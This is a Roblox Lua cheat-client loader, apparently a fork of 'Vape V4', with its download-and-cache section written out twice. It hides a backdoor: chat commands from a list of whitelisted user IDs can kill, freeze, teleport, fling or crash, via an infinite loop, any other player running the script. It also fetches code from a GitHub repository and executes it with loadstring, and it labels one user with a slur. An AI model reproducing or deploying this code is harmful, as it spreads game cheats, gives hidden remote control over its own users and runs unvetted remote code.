local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local LOCAL_PLAYER = Players.LocalPlayer

local whitelist = {
	Owner = {
		4279175156, 4202838123, 4307561815, 4380912728, 8334967500, 4240568437, 4262245137, 8336776571, 8309882908, 8335222717,
		4429753384, 8038312847, 3662747580, 4371940736, 116968806, 8337993466, 8336675908, 8293712327, 8244741218, 8313657982
	},
	Private = {
		5413983848, 4191327145, 1848051618, 1965898454, 1666325842, 1513390800, 8338110211, 8305161267,
		5546161719, 1983015440, 3204169739, 1880511134, 8336731586, 314732068, 3932037947, 8305374142,
		570843764, 4285992482, 8319446554, 8253283385, 8244658784, 8244710849, 8336505332, 8293567118
	},
	Slow = {1562251033}
}

local function isInList(u, list)
	for _, id in ipairs(list) do
		if u == id then return true end
	end
	return false
end

local function isWhitelisted(u)
	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
end

local function applyTag(plr, txt, col)
	local function render()
		local head = plr.Character and plr.Character:FindFirstChild("Head")
		if not head or head:FindFirstChild("VapeTag") then return end
		local b = Instance.new("BillboardGui")
		b.Name = "VapeTag"
		b.Size = UDim2.new(0, 100, 0, 20)
		b.StudsOffset = Vector3.new(0, 3, 0)
		b.AlwaysOnTop = true
		b.Adornee = head
		b.Parent = head
		local l = Instance.new("TextLabel")
		l.Size = UDim2.fromScale(1, 1)
		l.BackgroundTransparency = 1
		l.Text = txt
		l.TextColor3 = col
		l.TextStrokeTransparency = 0.3
		l.TextStrokeColor3 = Color3.new(0, 0, 0)
		l.Font = Enum.Font.GothamBold
		l.TextScaled = true
		l.Parent = b
	end
	if plr.Character then render() end
	plr.CharacterAdded:Connect(function()
		task.wait(0.5)
		render()
	end)
end

local function tag(plr)
	local id = plr.UserId
	if isInList(id, whitelist.Owner) then
		applyTag(plr, "Vape OWNER", Color3.fromRGB(210, 4, 45))
	elseif isInList(id, whitelist.Private) then
		applyTag(plr, "Vape Private", Color3.fromRGB(170, 0, 255))
	elseif isInList(id, whitelist.Slow) then
		applyTag(plr, "Retard", Color3.fromRGB(70, 130, 255))
	end
end

local function hasTag(plr)
	local head = plr.Character and plr.Character:FindFirstChild("Head")
	return head and head:FindFirstChild("VapeTag") ~= nil
end

task.spawn(function()
	while true do
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr ~= LOCAL_PLAYER and not hasTag(plr) then
				tag(plr)
			end
		end
		task.wait(2)
	end
end)

Players.PlayerAdded:Connect(function(p)
	task.delay(1, function()
		tag(p)
		tag(LOCAL_PLAYER)
	end)
end)

LOCAL_PLAYER.CharacterAdded:Connect(function()
	task.wait(1)
	tag(LOCAL_PLAYER)
end)

local lastCommand = {
	kill = 0,
	crash = 0,
	freeze = 0,
	bring = 0,
	fling = 0,
	log = 0
}

local function getSenderHRP()
	for _, plr in ipairs(Players:GetPlayers()) do
		if isWhitelisted(plr.UserId) and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			return plr.Character.HumanoidRootPart
		end
	end
	return nil
end

local function handleCommand(cmd)
	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
	local char = LOCAL_PLAYER.Character
	local hrp = char and char:FindFirstChild("HumanoidRootPart")

	if cmd == "kill" then
		if char then
			for _, part in ipairs(char:GetDescendants()) do
				if part:IsA("BasePart") then
					part:BreakJoints()
				end
			end
		end

	elseif cmd == "crash" then
		while true do end

	elseif cmd == "freeze" and hrp then
		if not hrp:FindFirstChild("Frozen") then
			local bv = Instance.new("BodyVelocity")
			bv.Name = "Frozen"
			bv.Velocity = Vector3.new(0, 0, 0)
			bv.MaxForce = Vector3.new(1, 1, 1) * 1e9
			bv.P = 1e5
			bv.Parent = hrp
		end

	elseif cmd == "bring" and hrp then
		local target = getSenderHRP()
		if target then
			hrp.CFrame = target.CFrame + Vector3.new(0, 3, 0)
		end

	elseif cmd == "fling" and hrp then
		local target = getSenderHRP()
		if target then
			local bv = Instance.new("BodyVelocity")
			bv.Velocity = (target.Position - hrp.Position).Unit * 200
			bv.MaxForce = Vector3.new(1, 1, 1) * 1e6
			bv.P = 9e4
			bv.Parent = hrp
			game.Debris:AddItem(bv, 0.5)
		end

	elseif cmd == "log" then
		local whisper = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXWhisper")
		local sender = getSenderHRP() and Players:GetPlayerFromCharacter(getSenderHRP().Parent)
		if whisper and sender then
			task.delay(0.4, function()
				whisper:SendAsync("8Uz1P", sender)
			end)
		end
	end
end

TextChatService.OnIncomingMessage = function(message)
	local source = message.TextSource
	if not source then return end
	local senderId = source.UserId
	if not isWhitelisted(senderId) then return end

	local msg = message.Text:lower()
	for command, _ in pairs(lastCommand) do
		if msg == ";"..command then
			lastCommand[command] = tick()
		end
	end
end

task.spawn(function()
	while true do
		local now = tick()
		for command, t in pairs(lastCommand) do
			if now - t <= 2 then
				handleCommand(command)
			end
		end
		task.wait(0.5)
	end
end)

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/SOILXP/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then error(res) end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/SOILXP/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

local isfile = isfile or function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil and res ~= ''
end

local delfile = delfile or function(file)
	writefile(file, '')
end

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/SOILXP/VapeV4ForRoblox/' .. readfile('newvape/profiles/commit.txt') .. '/' .. select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('%.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n' .. res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function wipeFolder(path)
	if not isfolder(path) then return end
	for _, file in listfiles(path) do
		if file:find('loader') then continue end
		if isfile(file) and select(1, readfile(file):find('--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.')) == 1 then
			delfile(file)
		end
	end
end

for _, folder in {'newvape', 'newvape/games', 'newvape/profiles', 'newvape/assets', 'newvape/libraries', 'newvape/guis'} do
	if not isfolder(folder) then makefolder(folder) end
end

if not shared.VapeDeveloper then
	local _, subbed = pcall(function()
		return game:HttpGet('https://github.com/SOILXP/VapeV4ForRoblox')
	end)
	local commit = subbed:find('currentOid')
	commit = commit and subbed:sub(commit + 13, commit + 52) or nil
	commit = commit and #commit == 40 and commit or 'main'
	if commit == 'main' or (isfile('newvape/profiles/commit.txt') and readfile('newvape/profiles/commit.txt') or '') ~= commit then
		wipeFolder('newvape')
		wipeFolder('newvape/games')
		wipeFolder('newvape/guis')
		wipeFolder('newvape/libraries')
	end
	writefile('newvape/profiles/commit.txt', commit)
end

return loadstring(downloadFile('newvape/main.lua'))()
